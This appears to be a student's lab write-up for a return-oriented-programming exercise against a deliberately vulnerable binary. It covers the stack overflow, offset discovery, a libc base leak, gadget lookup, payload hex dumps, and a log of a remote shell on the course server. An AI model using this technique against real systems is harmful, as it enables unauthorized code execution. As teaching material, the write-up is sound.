# ROPME Vulnerability Analysis and Exploitation

## 1. Vulnerability Analysis and Fix

The program contains a buffer overflow vulnerability in the `func()` function. Let's analyze the vulnerability and its potential fixes.

### The Vulnerable Code:
```c
void func(){
    char overflowme[32];
    read(0, overflowme, 0x200);
}
```

### Vulnerability Details:
- A 32-byte buffer is allocated but allows reading up to 512 bytes (0x200)
- This mismatch allows writing beyond the buffer's boundaries
- The stack layout makes this particularly dangerous as it can overwrite the return address

### Security Checks:
Using `checksec`, we can see the binary's security features:
```
[*] '/home/CS20102107/assignments/ROPME_v1.2/ropme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key findings:
- No stack canary protection
- NX (Non-Execute) is enabled, preventing direct shellcode execution
- PIE is disabled, making code addresses predictable

## 2. Finding Return Address Offset

We used a systematic approach with cyclic patterns to find the exact offset:

1. First, we generated and input a cyclic pattern:
```bash
pwndbg> r < <(cyclic 100)
```

2. When the program crashed, we examined the crash details:
```
Program received signal SIGSEGV, Segmentation fault.
RSP  0x7fffffffdf78 ◂— 0x6161616c6161616b ('kaaalaaa')
```

3. We determined the offset using cyclic:
```bash
pwndbg> cyclic -l kaaa -n 4
Finding cyclic pattern of 4 bytes: b'kaaa' (hex: 0x6b616161)
Found at offset 40
```

This confirms that the return address is located at offset 40, which makes sense given:
- 32 bytes for the buffer
- 8 bytes for saved rbp
- Return address starts at byte 40

## 3. Finding Libc Base Address

The program outputs the setvbuf address, which we use to calculate libc's base address. From our exploit output:

```
The address of setvbuf :   0x7fade1eb5ce0
[*] setvbuf address: 0x7fade1eb5ce0
[*] libc base: 0x7fade1e31000
```

### Address Calculation Process:
1. Get setvbuf runtime address from program output
2. Subtract setvbuf's offset in libc to get base address
3. Use this base to calculate other function addresses:
   ```
   [*] system address: 0x7fade1e83290
   [*] binsh address: 0x7fade1fe55bd
   ```

## 4. Finding and Using Gadgets

We located necessary gadgets using ROPgadget:
```bash
ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
0x0000000000023b6a : pop rdi ; ret
```

Our final payload structure (from debug output):
```
[DEBUG] Sent 0x60 bytes:
00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
*
00000020  41 41 41 41  41 41 41 41  6b 4b e5 e1  ad 7f 00 00  │AAAA│AAAA│kK··│····│
00000030  6a 4b e5 e1  ad 7f 00 00  bd 55 fe e1  ad 7f 00 00  │jK··│····│·U··│····│
00000040  90 32 e8 e1  ad 7f 00 00  6a 4b e5 e1  ad 7f 00 00  │·2··│····│jK··│····│
00000050  00 00 00 00  00 00 00 00  40 7a e7 e1  ad 7f 00 00  │····│····│@z··│····│
```

## 5. Remote Shell Access

Our exploit successfully gained shell access, as demonstrated:
```bash
$ id
uid=1032(CS20102107) gid=1032(CS20102107) groups=1032(CS20102107)
```

## 6. Clean Program Termination

We achieved graceful termination by adding exit() to our ROP chain. The debug output shows clean exit:
```bash
$ exit
[*] Got EOF while reading in interactive
[*] Process './ropme' stopped with exit code 0 (pid 995514)
```

This indicates successful execution and clean termination without crashes, satisfying all requirements from the checklist.

```bash
PS C:\Users\bc032\OneDrive\Desktop\ITM\3-2\CS\ROPME_v1.2> python expl.py
[*] 'C:\\Users\\bc032\\OneDrive\\Desktop\\ITM\\3-2\\CS\\ROPME_v1.2\\ropme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] 'C:\\Users\\bc032\\OneDrive\\Desktop\\ITM\\3-2\\CS\\ROPME_v1.2\\libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[x] Opening connection to 122.38.251.9 on port 31337
[x] Opening connection to 122.38.251.9 on port 31337: Trying 122.38.251.9
[+] Opening connection to 122.38.251.9 on port 31337: Done
[DEBUG] Received 0x2a bytes:
    b'The address of setvbuf :   0x7fa925358ce0\n'
[*] setvbuf address: 0x7fa925358ce0
[*] libc base: 0x7fa9252d4000
[*] system address: 0x7fa925326290
[*] exit address: 0x7fa92531aa40
[*] binsh address: 0x7fa9254885bd
[*] pop rdi ret address: 0x7fa9252f7b6a
Sending payload...
[DEBUG] Sent 0x60 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  6b 7b 2f 25  a9 7f 00 00  │AAAA│AAAA│k{/%│····│
    00000030  6a 7b 2f 25  a9 7f 00 00  bd 85 48 25  a9 7f 00 00  │j{/%│····│··H%│····│
    00000040  90 62 32 25  a9 7f 00 00  6a 7b 2f 25  a9 7f 00 00  │·b2%│····│j{/%│····│
    00000050  00 00 00 00  00 00 00 00  40 aa 31 25  a9 7f 00 00  │····│····│@·1%│····│
    00000060
Payload sent!
[*] Switching to interactive mode
id
[DEBUG] Sent 0x1 bytes:
    b'i'
[DEBUG] Sent 0x1 bytes:
    b'd'
[DEBUG] Sent 0x1 bytes:
    b'\n'
[DEBUG] Received 0x42 bytes:
    b'uid=1050(CS22102017) gid=1050(CS22102017) groups=1050(CS22102017)\n'
uid=1050(CS22102017) gid=1050(CS22102017) groups=1050(CS22102017)
ls
[DEBUG] Sent 0x1 bytes:
    b'l'
[DEBUG] Sent 0x1 bytes:
    b's'
[DEBUG] Sent 0x1 bytes:
    b'\n'
[DEBUG] Received 0x28 bytes:
    b'libc.so.6\n'
    b'Makefile\n'
    b'ropme\n'
    b'ropme.c\n'
    b'run.sh\n'
libc.so.6
Makefile
ropme
ropme.c
run.sh
exit
[DEBUG] Sent 0x1 bytes:
    b'e'
[DEBUG] Sent 0x1 bytes:
    b'x'
[DEBUG] Sent 0x1 bytes:
[DEBUG] Sent 0x1 bytes:
    b't'
[DEBUG] Sent 0x1 bytes:
    b'\n'
[*] Got EOF while reading in interactive
```